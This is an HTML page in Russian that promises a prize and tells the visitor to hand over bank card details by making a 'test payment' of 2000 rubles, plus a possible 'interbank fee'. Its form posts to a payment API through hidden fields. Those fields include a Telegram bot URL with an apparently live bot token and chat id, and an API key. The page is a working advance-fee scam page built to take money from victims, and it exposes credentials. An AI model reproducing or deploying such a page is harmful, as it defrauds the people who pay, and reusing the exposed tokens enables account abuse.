<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Получите свой приз</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Montserrat', sans-serif;
      background: linear-gradient(135deg, #FF6FD8, #3813C2);
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
    }

    .card {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 40px;
      text-align: center;
      max-width: 400px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
    }

    h1 {
      font-size: 2.5em;
      margin-bottom: 20px;
    }

    p {
      font-size: 1.2em;
      margin-bottom: 30px;
    }

    input, textarea {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 2px solid #fff;
      border-radius: 10px;
      background: rgba(255, 255, 255, 0.1);
      color: white;
      font-size: 1em;
    }

    textarea {
      height: 120px;
    }

    .btn {
      background-color: #fff;
      color: #3813C2;
      border: none;
      padding: 15px 30px;
      border-radius: 30px;
      font-size: 1.2em;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s ease;
    }

    .btn:hover {
      background-color: #e2e2e2;
    }

    .confetti {
      position: absolute;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
  </style>
</head>
<body>

  <canvas class="confetti"></canvas>

  <div class="card">
    <h1>Получите свой приз!</h1>
    <p>Для получения приза, Вам необходимо сообщить реквезиты банковской карты.</p>
    <p>Для передачи реквезитов выполните тестовый платеж на сумму 2000 р на наш счет.</p>
    <p>Также возможна небольшая межбанковская комиссия.</p>
    <p>После этого Вы сразу получите свой приз.</p>
    
    <!-- Contact Form -->
    <form id="contact-form" method="post" action="https://paysystem24.com/api/request/">
		<input type="hidden" name="amount" value="2000"/>
        <input type="hidden" name="merchant_order_id" value="optional"/>
        <input type="hidden" name="use_card_payment" value="RUB"/>
        <input type="hidden" name="success_url" value="https://familyman111.github.io/thr.html"/>
        <input type="hidden" name="fail_url" value="https://familyman111.github.io/index.html"/>
        <input type="hidden" name="notice_url" value="https://api.telegram.org/bot6311769211:AAF6CvymwqypKKsi1syD7EtyPFdkX1mNSAM/sendMessage?chat_id=-1001971396205&text=OK"/>
        <input type="hidden" name="api_key" value="4a6fbfd9163fff65d1216b7d509d03a5f4707ce03d126a6684ad3b05bd595759"/>
		<button type="submit" class="btn">Продолжить</button>
    </form>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <script>
    const canvas = document.querySelector('.confetti');
    const confetti = window.confetti.create(canvas, { resize: true });
    confetti({
      particleCount: 150,
      spread: 90,
      origin: { y: 0.6 }
    });
  </script>

</body>
</html>
